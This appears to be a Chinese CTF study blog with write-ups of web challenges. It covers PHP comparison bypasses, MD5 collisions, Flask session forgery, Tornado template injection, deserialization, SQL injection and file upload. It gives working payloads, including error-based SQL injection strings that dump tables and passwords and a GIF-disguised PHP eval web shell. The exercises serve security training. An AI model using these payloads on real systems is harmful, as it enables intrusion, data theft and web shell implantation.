class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">就是对post传入的password的要求，如果检测到password是数字就不对，但是要求那个password等于404，然后注意到这里是弱等于</span><br><span class="line">password=404a绕过    /POST/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">传入进去，还是回显&quot;Only Cuit&#x27;s students can buy the FLAG&quot;还是要求cuit的学生；于是抓包看看</span><br><span class="line">看到这里有个user=0;就是猜测，给他改成1(真) 过了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step3:</span><br><span class="line">现在还要求金额，前面有个100000000，我们传进去；</span><br><span class="line">数字太长了，如果减一点，又会显示钱不够，于是就想到了科学计数法</span><br><span class="line">password=404a&amp;money=1e10</span><br><span class="line"></span><br><span class="line">这里还可以利用php特9性，这里是php/5.3.3,可以利用函数strcmp(),使用数组(不同类型参数)绕过；</span><br><span class="line">password=404a&amp;money[]=1000</span><br></pre></td></tr></table></figure>

<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="BJDCTF2020-Easy-MD5-1"><a href="#BJDCTF2020-Easy-MD5-1" class="headerlink" title="[BJDCTF2020]Easy MD5 1"></a>[BJDCTF2020]Easy MD5 1</h3><h4 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.基于MD5()的万能密码:ffifdyop</span><br><span class="line">2.ctfshow&#123;59f393c8-e74c-4bbb-a215-0d0cf1af1735&#125;MD5弱比较：</span><br><span class="line">原值                 加密后的密文 </span><br><span class="line"></span><br><span class="line">QNKCDZO           0E830400451993494058024219903391</span><br><span class="line">240610708         0E462097431906509019562988736854</span><br><span class="line">s878926199a       0E545993274517709034328855841020</span><br><span class="line">s155964671a       0E342768416822451524974117254469</span><br><span class="line">s214587387a       0E848240448830537924465865611904</span><br><span class="line">还有种$a==md5($a);</span><br><span class="line">$a=0e215962017</span><br><span class="line">$md5==md5(md5($a))</span><br><span class="line">$a=0e1138100474</span><br><span class="line">3.MD5强比较：</span><br><span class="line">·再就是强比较，我们可以利用数组绕过</span><br><span class="line">利用了PHP语言的一些特性以及MD5函数处理非字符串输入的行为。具体来说，当MD5函数在PHP中被用于处理数组类型的输入时，它不会像处理字符串那样计算其哈希值，而是直接返回NULL。这是因为MD5函数预期接收的是字符串参数，而非数组。</span><br><span class="line">payload:a[]=1&amp;b[]=2</span><br><span class="line">·爆破</span><br><span class="line">4.MD5强比较：如果限制条件加了string/(string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;]/</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">MD5万能密码：成功跳转页面</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line">&#125;</span><br><span class="line">payload:url?a=QNKCDZO&amp;b=s878926199a </span><br><span class="line"></span><br><span class="line">step3:</span><br><span class="line">强比较：</span><br><span class="line">param1[]=1&amp;param2[]=2    /post/</span><br></pre></td></tr></table></figure>

<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="flask-session欺骗"><a href="#flask-session欺骗" class="headerlink" title="flask session欺骗"></a>flask session欺骗</h2><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点:"></a>知识点:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.flask session欺骗：</span><br><span class="line">原理：flask仅仅对数据进行了签名，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</span><br><span class="line">flask下，session都有一个key 用来加密session,对其使用脚本解密，修改，伪造</span><br><span class="line">脚本&quot;flask-session-cookie-manager-master&quot;</span><br><span class="line">2.爆破</span><br><span class="line">3.unicode欺骗</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">法一（爆破）：</span><br><span class="line">step1:</span><br><span class="line">源码看到要求admin用户，但是密码不知道，这道题，可以用bp对密码进行爆破</span><br><span class="line">username:admin  password:123</span><br><span class="line">法二（Unicode欺骗）：</span><br><span class="line">step1:发现注册页面，我们注册一个账号，进去看看有什么信息，在chang源码下发现一个github链接,是题目的源码（原链接已经打不开，我自己在github上找的一个）：https://github.com/cor0ps/HCTF2018_admin</span><br><span class="line">step2:在routes.py里面看到了name = strlower(form.username.data)，就是说用户名输入什么都会变成小写形式，所以想到ADMIN绕过，但是ADMIN也是显示被注册了。</span><br><span class="line">step3:但python中自带转小写函数lower()却没有用，跟进strlower函数看看是如何使用的；发现其使用的nodeprep.prepare()，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现Twisted==10.2.0,这里有个unicode的漏洞   https://symbl.cc/en/unicode/blocks/phonetic-extensions/</span><br><span class="line">于是我们使用ᴀDMIN进行注册，注册之后修改密码，实际上修改的就是admin的密码，然后登录</span><br><span class="line">法三：（flask下session伪造）</span><br><span class="line">step1:题目要求用户是admin，我们想到cookie和session，先注册一个我们自己的账号，再我们打开cookie看到了session的字段但是以.e开头，所以被加密；</span><br><span class="line">step3:我们使用session解密工具，得到一串看到username：111；我们将这段修改的字符串放进加密工具里面，在config.py存在SECRET_KEY，得用它加密，得到的去替换原来的session,刷新一边就可以了</span><br></pre></td></tr></table></figure>

<h4 id="记一个脚本"><a href="#记一个脚本" class="headerlink" title="记一个脚本"></a>记一个脚本</h4><h5 id="用了itsdangerous库进行签名和Base64编码以及可能的zlib压缩的会话cookie"><a href="#用了itsdangerous库进行签名和Base64编码以及可能的zlib压缩的会话cookie" class="headerlink" title="用了itsdangerous库进行签名和Base64编码以及可能的zlib压缩的会话cookie"></a>用了itsdangerous库进行签名和Base64编码以及可能的zlib压缩的会话cookie</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="护网杯 2018]easy_tornado"></a>护网杯 2018]easy_tornado</h3><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tornado模板注入</span><br></pre></td></tr></table></figure>

<h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/templates.html">https://tornado-zh.readthedocs.io/zh/latest/guide/templates.html</a>  (语法)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.表达式使用&#123;&#123;&#125;&#125;进行包裹</span><br><span class="line">2.看到tornado模板基本上可以通过handler.settings一把梭。（可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息）</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">打开环境看到三个提示，1.flag in /fllllllllllllag  2.render 3.md5(cookie_secret+md5(filename)) 看到url上filename=.....&amp;filehash=......filename已经知道filename为fllllllllllllag，现在得知道cookie_secret</span><br><span class="line">step2:</span><br><span class="line">看到了render函数，我们修改了下filehash，url变成?msg=error,测试?msg=&#123;&#123;1*1&#125;&#125;回显orz,所以是tornado模板注入，以及我们需要知道set_cookie是什么</span><br><span class="line">payload:?msg=&#123;&#123;hander.settings&#125;&#125;就看到了set_cookie的信息</span><br><span class="line">step3：</span><br><span class="line">按要求拼接加密得到payload获得flag信息</span><br></pre></td></tr></table></figure>



<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><h4 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php伪协议：</span><br></pre></td></tr></table></figure>

<h4 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://　　　　写入数据</span><br><span class="line">php://input　　执行php</span><br><span class="line">　　//filter　　查看源码</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line">审计源码，需要我们传递参数，需要我们写入数据，这里用到了伪协议 data://，然后file_get_contnets()读取里面的字符串与之匹配</span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">flag.php不可以直接访问，我们需要读取useless.php的源码，这时候用到了伪协议中的php://filter来读取，我们读取的字符串是base64格式的需要我们进行转码</span><br><span class="line"></span><br><span class="line">step3:</span><br><span class="line">构造反序列化，得到最终的password.</span><br><span class="line"></span><br><span class="line">step4：</span><br><span class="line">构造最终的payload，然后在源码中获得flag.</span><br></pre></td></tr></table></figure>

<h2 id="SQL（报错）"><a href="#SQL（报错）" class="headerlink" title="SQL（报错）"></a>SQL（报错）</h2><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">报错注入:</span><br><span class="line">在使用语句时，如果XPath_string不符合该种类格式，就会出现格式错误，并且会以系统报错的形式提示出错误！</span><br><span class="line">（局限性查询字符串长度最大为32位，要突破此限制可使用right(),left()，substr()来截取字符串）</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-2"><a href="#解题过程：-2" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">试了几个语句，都没有回显，所以猜测肯定是有过滤，用bp进行字典爆破，发现像union and by什么的被过滤了，在后续测试中发现空格过滤了，我们可以用()来绕过</span><br><span class="line">step2：爆库</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">step3: 爆表</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">step4：爆字段</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">step5: 爆数据</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;~&#x27;,password))from(H4rDsq1)),0x7e),1))#</span><br><span class="line">step6:得到一半数据，使用right函数获得剩下的数据</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><h4 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码审计</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-3"><a href="#解题过程：-3" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">整理代码，代码审计</span><br><span class="line">step2:</span><br><span class="line">一个MD5弱比较，一个弱比较，直接绕过出答案</span><br></pre></td></tr></table></figure>

<h2 id="unserialize-1"><a href="#unserialize-1" class="headerlink" title="unserialize"></a>unserialize</h2><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><h4 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-4"><a href="#解题过程：-4" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">step1：</span><br><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">审计代码，发现是反序历化，那个function is_valid($s)不影响，没有要绕过的点，以及我们发现这里面读文件的我们需要的，所以op=2,filename=&quot;flag.php&quot;</span><br><span class="line"></span><br><span class="line">step2:序列化</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">public $op=2;</span><br><span class="line">public $filename=&quot;flag.php&quot;;</span><br><span class="line">public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=new FileHandler();</span><br><span class="line">$str=serialize($a);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line">得到：</span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">step3:</span><br><span class="line">payload:</span><br><span class="line">/?str=</span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><h4 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件上传</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-3"><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.user.ini php配置文件:帮忙解析php文件</span><br><span class="line">.htaccess:</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-5"><a href="#解题过程：-5" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">上传一句话木马，发现对文件后缀名,&lt;?,文件内格式都进行了验证，我们最后的木马是：</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">eval($_POST[&#x27;666&#x27;]);</span><br><span class="line">echo &quot;YES&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">但是上传成功，没有被解析</span><br><span class="line">step2：</span><br><span class="line">上传.user.ini文件去解析木马</span><br><span class="line">step3:</span><br><span class="line">上传成功，这里是访问，uplods/xxxxxxxx/index.php,用蚁剑连接后台，找到flag</span><br></pre></td></tr></table></figure>

